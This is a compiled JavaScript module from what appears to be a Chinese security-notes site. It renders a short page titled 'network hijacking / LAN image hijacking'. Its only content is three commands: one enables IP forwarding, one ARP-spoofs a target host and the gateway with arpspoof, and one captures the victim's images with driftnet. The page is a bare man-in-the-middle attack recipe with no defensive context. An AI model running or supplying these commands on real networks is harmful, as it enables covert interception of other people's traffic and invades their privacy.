import{_ as e,K as a,L as i,W as n}from"./framework-edebdfe1.js";const r={},d=n(`<h1 id="网络劫持" tabindex="-1"><a class="header-anchor" href="#网络劫持" aria-hidden="true">#</a> 网络劫持</h1><h2 id="局域网图片劫持" tabindex="-1"><a class="header-anchor" href="#局域网图片劫持" aria-hidden="true">#</a> 局域网图片劫持</h2><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 网关 对方ip
driftnet -i eth0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3),s=[d];function t(c,o){return a(),i("div",null,s)}const h=e(r,[["render",t],["__file","hijack.html.vue"]]);export{h as default};
